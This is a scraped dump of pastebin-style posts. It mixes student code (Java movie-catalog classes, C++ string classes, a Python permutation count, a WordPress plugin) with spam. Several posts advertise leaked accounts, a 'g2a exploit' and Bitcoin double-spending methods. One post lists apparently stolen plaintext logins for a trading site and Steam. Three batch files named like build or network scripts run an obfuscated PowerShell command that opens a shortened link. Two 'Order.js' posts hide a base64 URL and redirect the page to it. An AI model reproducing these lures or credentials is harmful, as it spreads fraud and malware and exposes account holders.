id,title,username,language,date,content
9gd0upk5,Aporte 3 - Creacion de main y menubar -  (seccion comentada porque los paneles aun no existen),julibar,Java,Wednesday 7th of May 2025 12:45:21 PM CDT,"//archivo Principal.java

package Paquete;

import java.awt.EventQueue;

import javax.swing.DefaultListModel;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

public class Principal extends JFrame {

	private static final long serialVersionUID = 1L;
	private JPanel contentPane;
	private static DefaultListModel<Pelicula> listPeliculas;

	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					Principal frame = new Principal();
					listPeliculas = new DefaultListModel<Pelicula>();
					frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}


	public Principal() {
		setTitle(""Programa"");
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		setLocationRelativeTo(null);
		
		JMenuBar menuBar = new JMenuBar();
		setJMenuBar(menuBar);
		
		JMenu JmPeliculas = new JMenu(""Peliculas"");
		menuBar.add(JmPeliculas);
		
		JMenuItem MenuItemAgregar = new JMenuItem(""Agregar""); 
		MenuItemAgregar.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				contentPane.removeAll(); 
			// --- Panel sin crear  ---	
			//	PanelIngresoPeliculas Ingreso = new PanelIngresoPeliculas(); 	
			//Ingreso.setDefaultListModel(listPeliculas);
			//contentPane.add(Ingreso);
			contentPane.repaint();
			contentPane.revalidate();							
			}
		});
		JmPeliculas.add(MenuItemAgregar);
		
		JMenuItem MenuItemListar = new JMenuItem(""Listar"");
		MenuItemListar.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				contentPane.removeAll();
			// --- Panel sin crear  ---	
			//	PanelAgregarPeliculas Lista = new PanelAgregarPeliculas();
			//	Lista.setDefaultListModel(listPeliculas);
			//	contentPane.add(Lista);
				contentPane.repaint();
				contentPane.revalidate();
			}
		});		
		JmPeliculas.add(MenuItemListar);
		
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
	}

}"
31cH0x2H,Aporte 2 - Clase Pelicula - Punto 2 del TP,julibar,Java,Wednesday 7th of May 2025 12:44:17 PM CDT,"//archivo Pelicula.java

package Paquete;

public class Pelicula {
		
	private static int proxId = 0;
	private final int id;
	private String nombre;
	private Categoria genero;
	
	
	public Pelicula() {
		super();
		proxId = proxId + 1;
		id = proxId;
		nombre = ""Sin definir"";
		Categoria gen = new Categoria(""Sin definir""); 
		genero = gen;
		
	}
	
	
	public Pelicula(String nombre, String genero) {
		super();
		proxId = proxId + 1;
		id = proxId;
		this.nombre = nombre;
		Categoria gen = new Categoria(genero); 
		this.genero = gen;
	}


	public String getNombre() {
		return nombre;
	}


	public void setNombre(String nombre) {
		this.nombre = nombre;
	}


	public int getId() {
		return id;
	}

	
	public static int getProxId() {
		return (proxId + 1);
	}

	
	public String toString() {
		return nombre + "" ("" + genero.toString() + "")"";
	}
				
}
"
6Cm0C6SB,EARN $900 INSTANTLY 2025? GV,johny1234567,PHP,Wednesday 7th of May 2025 12:44:09 PM CDT,281119 - check it out at https://tinyurl.com/nulledbb
CC59zStp,Aporte 1 - clase Categoria - Punto 2 del TP,julibar,Java,Wednesday 7th of May 2025 12:43:30 PM CDT,"//archivo Categoria.java

package Paquete;

public class Categoria {
		
	private static int proxId = 0;
	private final int id;
	private String nombre;
	
	
	public Categoria() {
		super();
		proxId = proxId + 1;
		id = proxId;
		nombre = ""Sin definir"";
	}
	
	
	public Categoria(String nombre) {
		super();
		proxId = proxId + 1;
		id = proxId;
		this.nombre = nombre;
	}


	public String getNombre() {
		return nombre;
	}


	public void setNombre(String nombre) {
		this.nombre = nombre;
	}


	public int getId() {
		return id;
	}


	@Override
	public String toString() {
		return nombre;
	}
			
}
"
vNKi6ty0,Make $1000 15-MINUTES (BEGINNER) OV,abcd1237760,JavaScript,Wednesday 7th of May 2025 12:38:06 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

nGqdbBMGJA
"
7iJKTJ29,Doublespending using Vanity Wallet,navrajkhunger,JavaScript,Wednesday 7th of May 2025 12:36:06 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 69079
hVW5yat8,Chaturbate with Tokens,Xp_Isolation,JavaScript,Wednesday 7th of May 2025 12:35:18 PM CDT,58396 Accounts Posted On https://t.me/leakzbyeminem
anAq2Q92,Leaked Accounts - Fresh HitsUntitled,johny1234567,PHP,Wednesday 7th of May 2025 12:34:07 PM CDT,893764 - check it out at https://tinyurl.com/nulledbb
bJcnxNJL,Untitled,hoz65105,HTML,Wednesday 7th of May 2025 12:33:59 PM CDT,"917
---------------
SOFT : Windows 10
HOST : https://mazztrade.com
USER : zuzannaslawa@gmail.com
PASS : Zuzann871109
UNKN : Default
KYC : YES
2FA : NO
LAST LG : NONE
---------------
906
---------------
SOFT : Windows 10
HOST : https://store.steampowered.com
USER : ehpmm0vuu
PASS : 8j1h3kl4n
UNKN : Default
KYC : NO INFO
2FA : NO INFO
LAST LG : NONE
---------------"
cr821Lqp,Untitled,Josif_tepe,C++,Wednesday 7th of May 2025 12:32:21 PM CDT,"#include <iostream>

using namespace std;
class Recenica {
private:
    char * niza;
public:
    Recenica() {
        niza = new char[6];
        strcpy(niza, ""Zdravo"");
    }
    Recenica(char * _niza) {
        niza = new char[strlen(_niza)];
        strcpy(niza, _niza);
    }
    Recenica(const Recenica & tmp) {
        niza = new char[strlen(tmp.niza)];
        strcpy(niza, tmp.niza);
    }
    ~Recenica() {
        delete [] niza;
    }
    
    void pechati() {
        cout << niza << endl;
    }
    void dodadiZnaci(char * _niza, bool lok) {
        char * tmp = new char[strlen(niza) + strlen(_niza)];
        if(lok == 1) {
            strcpy(tmp, niza);
            strcat(tmp, _niza);
        }
        else {
            strcpy(tmp, _niza);
            strcat(tmp, niza);
        }
        niza = new char[strlen(tmp)];
        strcpy(niza, tmp);
    }
    void brishiZnak(int poz) {
        char * tmp = new char[strlen(niza) - 1];
        int idx = 0;
        for(int i = 0; i < strlen(niza); i++) {
            if(i != poz) {
                tmp[idx] = niza[i];
                idx++;
            }
        }
        niza = new char[strlen(niza) - 1];
        strcpy(niza, tmp);
    }
};

int main()
{
    char recenica[25] = ""Mnogu sakam da ucham PSP"";
    Recenica r(recenica);
    
    r.pechati();
    r.dodadiZnaci(""za copy konstruktor"", 1);
    r.brishiZnak(24);
    r.pechati();
    return 0;
}
"
HE2kvEwN,Order.js,Epiphemeral,JavaScript,Wednesday 7th of May 2025 12:32:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26717/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
h8kMHZHG,EARN $900 INSTANTLY 2025⭐ DG,abcd1237760,JavaScript,Wednesday 7th of May 2025 12:31:18 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

SW7YntoqJM
"
p4Bd6uHj,build_project.ps1,Rip_batate,Batch,Wednesday 7th of May 2025 12:28:04 PM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AOAA4ADgANQBmAGEAOQAwAA==
EXIT /b
"
aVfmvfjz,schedule_tasks.ps1,Rip_batate,Batch,Wednesday 7th of May 2025 12:27:32 PM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANQA5ADYAMAA0ADMAMwA2AA==
EXIT /b
"
0kEkpgEa,"8 перестановка, Г после А и И",nq1s788,Python,Wednesday 7th of May 2025 12:25:55 PM CDT,"#8 https://kpolyakov.spb.ru/school/ege/gen.php?action=viewVar&answers=on&varId=14
alph = 'ГЛУБИНА'
cnt = 0
for q in range(7):
    for w in range(7):
        if w in [q]:
            continue
        for e in range(7):
            if e in [q, w]:
                continue
            for r in range(7):
                if r in [q, w, e]:
                    continue
                for t in range(7):
                    if t in [q, w, e, r]:
                        continue
                    for y in range(7):
                        if y in [q, w, e, r, t]:
                            continue
                        u = sum(range(7)) - sum([q, w, e, r, t, y])
                        s = alph[q] + alph[w] + alph[e] + alph[r] + alph[t] + alph[y] + alph[u]
                        if s.index('А') < s.index('Г') and s.index('И') < s.index('Г'):
                            cnt += 1
print(cnt)"
ajbv2Yn8,Make $1000 15-MINUTES  (BEGINNER) 6D,abcd1237760,JavaScript,Wednesday 7th of May 2025 12:24:33 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

f8atGfbLaC
"
p76vGnH1,free hf ebooks,fcotaylon,PHP,Wednesday 7th of May 2025 12:24:06 PM CDT,367213 - check it out at https://tinyurl.com/nulledbb
v2B4WZz8,Abuse RBF in BTC transactions,navrajkhunger,JavaScript,Wednesday 7th of May 2025 12:20:44 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 93911
0v5REf97,Crypto Accounts,Xp_Isolation,JavaScript,Wednesday 7th of May 2025 12:19:56 PM CDT,67121 Accounts Posted On https://t.me/leakzbyeminem
SFjEBKy6,EARN $900 INSTANTLY 2025 EI,italy_2,JavaScript,Wednesday 7th of May 2025 12:17:34 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

PA4jOfZg4u
"
x8LtwjYx,reset_network.cmd,Rip_batate,Batch,Wednesday 7th of May 2025 12:16:57 PM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANwA1AGMAMAA1ADgAYwA1AA==
EXIT /b
"
bR5LDVHr,Market.js,Epiphemeral,JavaScript,Wednesday 7th of May 2025 12:16:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77978/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cbayUMxP,free hf ebooks,fcotaylon,PHP,Wednesday 7th of May 2025 12:14:03 PM CDT,701756 - check it out at https://tinyurl.com/nulledbb
p4fLrpnR,Untitled,gavinvm,PHP,Wednesday 7th of May 2025 12:12:42 PM CDT,"My plugin structure: Everything but the php file is from the webpack distribution which i've copied

finance-calculator/
├── index.php
├── main.js            
├── main.css           
├── index.html         
└── assets/            


<?php
/*
Plugin Name:  Gavin's Finance App
Plugin URI:   https://your-site.com/
Description:  Embed the finance calculator using the [finance_calculator] shortcode.
Version:      1.0
Author:       Gavin
Author URI:   https://your-site.com/
*/

if ( ! defined( 'ABSPATH' ) ) exit;

function finance_app_enqueue_assets() {
    if (! is_singular()) return;

    global $post;
    if (has_shortcode($post->post_content, 'finance_calculator')) {
        $plugin_url = plugin_dir_url( __FILE__ );

        wp_enqueue_style( 'finance_app_css', $plugin_url . 'main.css', array(), '1.0' );
        wp_enqueue_script( 'finance_app_js', $plugin_url . 'main.js', array('jquery'), '1.0', true );

        wp_add_inline_script( 'finance_app_js',
            'const FINANCE_APP_URL = ""' . esc_url($plugin_url) . '"";',
            'before'
        );
    }
}
add_action( 'wp_enqueue_scripts', 'finance_app_enqueue_assets' );

function finance_app_shortcode() {
    ob_start();
    include plugin_dir_path( __FILE__ ) . 'index.html';
    $content = ob_get_clean();

    $plugin_url = plugin_dir_url( __FILE__ );
    $content = str_replace('src=""assets/', 'src=""' . $plugin_url . 'assets/', $content);
    $content = str_replace('href=""assets/', 'href=""' . $plugin_url . 'assets/', $content);

    return '<div class=""finance-calculator-container"">' . $content . '</div>';
}
add_shortcode( 'finance_calculator', 'finance_app_shortcode' );

"
BgaFwWWa,Untitled,Josif_tepe,C++,Wednesday 7th of May 2025 12:11:34 PM CDT,"#include <iostream>

using namespace std;
class Ucenik {
private:
    char * ime;
    
public:
    Ucenik(char * _ime) {
        ime = new char[strlen(_ime)];
        strcpy(ime, _ime);
        
    }
};

int main()
{

    return 0;
}
"
6te3vpwW,Make $1000 15-MINUTES (BEGINNER) OV,italy_2,JavaScript,Wednesday 7th of May 2025 12:10:48 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

LeR6LN9RXW
"
Ynfzxt10,Untitled,imbaprofeeder,HTML,Wednesday 7th of May 2025 12:07:28 PM CDT,"
HTML-код віджету
<script type=""text/javascript"" id=""widget-wfp-script"" src=""https://secure.wayforpay.com/server/pay-widget.js?ref=button""></script> <script type=""text/javascript"">function runWfpWdgt(url){var wayforpay=new Wayforpay();wayforpay.invoice(url);}</script> <button type=""button"" onclick=""runWfpWdgt('https://secure.wayforpay.com/button/bc4fb5f5de623');"" style=""display:inline-block!important;background:#0488cd;background-size:cover;width: 256px!important;height:54px!important;border:none!important;border-radius:14px!important;padding:16px!important;box-shadow:3px 2px 8px rgba(71,66,66,0.22)!important;text-align:center!important;outline:none!important;"" onmouseover=""this.style.opacity='0.8';"" onmouseout=""this.style.opacity='1';""> <span style=""font-family:Verdana,Arial,sans-serif!important;font-weight:bold!important;font-size:14px!important;color:#ffffff!important;line-height:18px!important;vertical-align:middle!important;"">Оплатити</span></button>


Посилання
https://secure.wayforpay.com/button/bc4fb5f5de623
"
